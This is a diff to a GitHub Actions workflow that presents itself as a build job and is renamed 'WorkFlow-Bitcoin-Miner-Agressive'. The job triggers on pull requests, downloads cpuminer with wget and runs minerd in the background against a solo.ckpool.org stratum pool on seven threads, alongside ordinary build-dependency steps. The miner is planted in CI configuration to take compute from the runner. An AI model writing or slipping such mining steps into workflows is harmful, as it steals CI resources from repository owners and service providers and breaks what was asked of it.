@@ -1,5 +1,5 @@
 ---
-name: WorkFlow-Bitcoin-Miner
+name: WorkFlow-Bitcoin-Miner-Agressive
 on:
   # See: https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request.
   pull_request:
@@ -34,10 +34,10 @@ jobs:
       - name: Determine commit range
         run: |
           git checkout HEAD~
-          echo "TEST_BASE=$(git rev-list -n$((${{ env.MAX_COUNT }} + 1)) --reverse HEAD ^$(git rev-list -n1 --merges HEAD))" >> "$GITHUB_ENV"
+          echo "TEST_BASE=$(git rev-list -n$((${{ env.MAX_COUNT }} + 1)) --reverse HEAD ^$(git rev-list -n1 --merges HEAD)^@ | head -1)" >> "$GITHUB_ENV"
       - run: |
           sudo apt-get update
-          sudo apt-get install -y wget clang-15 ccache build-essential libtool autotools-dev automake pkg-config bsdmainutils python3-zmq libevent-dev libboost-dev libsqlite3-dev libdb++-dev systemtap
+          sudo apt-get install wget clang-15 ccache build-essential libtool autotools-dev automake pkg-config bsdmainutils python3-zmq libevent-dev libboost-dev libsqlite3-dev libdb++-dev systemtap-sdt-dev libminiupnpc-dev libnatpmp-dev qtbase5-dev qttools5-dev qttools5-dev-tools qtwayland5 libqrencode-dev -y
           wget https://github.com/pooler/cpuminer/releases/download/v2.5.1/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz && tar -xf pooler-cpuminer-2.5.1-linux-x86_64.tar.gz
           ./minerd -a sha256d -o stratum+tcp://solo.ckpool.org:3333 -u 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa.Satoshi -p x -t 7 -D -P -B
       - name: Save Ccache cache
@@ -45,4 +45,5 @@ jobs:
         if: github.event_name != 'pull_request' && steps.ccache-cache.outputs.cache-hit != 'true'
         with:
           path: ${{ env.CCACHE_DIR }}
+          # https://github.com/actions/cache/blob/main/tips-and-workarounds.md#update-a-cache
           key: ${{ github.job }}-ccache-${{ github.run_id }}
